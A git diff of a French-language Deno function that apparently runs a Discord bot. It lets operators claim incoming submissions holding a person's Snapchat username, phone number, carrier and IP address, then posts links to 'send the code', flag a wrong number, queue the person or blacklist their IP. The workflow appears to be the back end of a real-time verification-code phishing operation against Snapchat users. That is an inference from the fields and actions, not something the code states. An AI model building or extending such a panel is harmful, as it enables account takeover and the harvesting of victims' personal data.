@@ -68,82 +68,72 @@ Deno.serve(async (req) => {
 
     // Already claimed?
     if (sub.claimed_by_discord_id) {
-      return Response.json({ type: 4, data: { content: "⚠️ Cette demande a déjà été prise en charge par quelqu'un.", flags: 64 } });
+      return Response.json({ type: 4, data: { content: "⚠️ Cette demande a déjà été prise en charge.", flags: 64 } });
     }
 
-    // Claim it
+    // Claim it atomically
     await base44.asServiceRole.entities.Submission.update(submissionId, { claimed_by_discord_id: userId });
 
     // Race condition check
     const updated = await base44.asServiceRole.entities.Submission.get(submissionId);
     if (updated.claimed_by_discord_id !== userId) {
-      return Response.json({ type: 4, data: { content: "⚡ Quelqu'un d'autre l'a pris juste avant vous!", flags: 64 } });
+      return Response.json({ type: 4, data: { content: "⚡ Quelqu'un d'autre l'a pris juste avant vous !", flags: 64 } });
     }
 
     const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";
-    const msgContent =
-      `🔐 **Demande prise en charge par <@${userId}>**\n\n` +
-      `👻 **Snapchat:** @${sub.snapchat || "N/A"}\n` +
-      `📞 **Téléphone:** ${sub.telephone || "N/A"}\n` +
-      `📡 **Opérateur:** ${sub.operateur || "N/A"}\n\n` +
-      `✅ [Envoyer le code](${appUrl}/?trigger=${submissionId})\n` +
-      `❌ [Mauvais numéro](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
-      `⏳ [Faire patienter](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
-      `🚫 [Blacklist](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(sub.ip_address || "")})`;
 
-    let responseMsg = "✅ Vous avez pris en charge cette demande !";
+    const threadContent =
+      `# 🔐 Demande prise en charge\n` +
+      `**👻 Snapchat:** @${sub.snapchat || "N/A"}\n` +
+      `**📞 Téléphone:** ${sub.telephone || "N/A"}\n` +
+      `**📡 Opérateur:** ${sub.operateur || "N/A"}\n\n` +
+      `## Actions disponibles\n` +
+      `✅ [**Envoyer le code**](${appUrl}/?trigger=${submissionId})\n` +
+      `❌ [**Mauvais numéro**](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
+      `⏳ [**File d'attente**](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
+      `🚫 [**Blacklist**](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(sub.ip_address || "")})`;
 
-    // Try private thread first
+    // Create private thread from the message
     try {
-      const thread = await botAPI(`/channels/${channelId}/threads`, "POST", {
+      const thread = await botAPI(`/channels/${channelId}/messages/${messageId}/threads`, "POST", {
         name: `📋 ${sub.snapchat || "Demande"} — ${sub.operateur || ""}`,
-        type: 12, // GUILD_PRIVATE_THREAD
-        auto_archive_duration: 60,
-        invitable: false
+        auto_archive_duration: 60
       });
+
+      // Add the claiming user to the thread
       await botAPI(`/channels/${thread.id}/thread-members/${userId}`, "PUT");
-      await botAPI(`/channels/${thread.id}/messages`, "POST", { content: msgContent });
-      responseMsg = "✅ Thread privé créé ! Vérifiez vos threads Discord.";
+
+      // Post the action links in the thread
+      await botAPI(`/channels/${thread.id}/messages`, "POST", { content: threadContent });
+
+      // Disable the button on the original message
+      await botAPI(`/channels/${channelId}/messages/${messageId}`, "PATCH", {
+        components: [{
+          type: 1,
+          components: [{
+            type: 2,
+            style: 2,
+            label: `✅ Pris par @${username}`,
+            custom_id: "claimed_done",
+            disabled: true
+          }]
+        }]
+      });
+
+      return Response.json({ type: 4, data: { content: `✅ Thread créé ! <#${thread.id}>`, flags: 64 } });
     } catch (e) {
-      console.error("Private thread failed, trying DM:", e.message);
-      // Fallback to DM
+      console.error("Thread creation failed:", e.message);
+
+      // Fallback: DM
       try {
         const dm = await botAPI("/users/@me/channels", "POST", { recipient_id: userId });
-        await botAPI(`/channels/${dm.id}/messages`, "POST", { content: msgContent });
-        responseMsg = "✅ Pris en charge ! Vérifiez vos DMs.";
+        await botAPI(`/channels/${dm.id}/messages`, "POST", { content: threadContent });
+        return Response.json({ type: 4, data: { content: "✅ Pris en charge ! Vérifiez vos DMs.", flags: 64 } });
       } catch (e2) {
         console.error("DM failed:", e2.message);
+        return Response.json({ type: 4, data: { content: "✅ Pris en charge, mais impossible de créer le thread.", flags: 64 } });
       }
     }
-
-    // Disable button on original message via webhook edit (no MANAGE_MESSAGES needed)
-    try {
-      const webhookUrl = Deno.env.get("DISCORD_WEBHOOK") || "";
-      const match = webhookUrl.match(/webhooks\/(\d+)\/([^\/\?]+)/);
-      if (match) {
-        const [, wId, wToken] = match;
-        await fetch(`https://discord.com/api/v10/webhooks/${wId}/${wToken}/messages/${messageId}`, {
-          method: "PATCH",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            components: [{
-              type: 1,
-              components: [{
-                type: 2,
-                style: 2,
-                label: `✅ Pris par @${username}`,
-                custom_id: "claimed",
-                disabled: true
-              }]
-            }]
-          })
-        });
-      }
-    } catch (e) {
-      console.error("Failed to edit original message:", e.message);
-    }
-
-    return Response.json({ type: 4, data: { content: responseMsg, flags: 64 } });
   }
 
   return Response.json({ type: 1 });
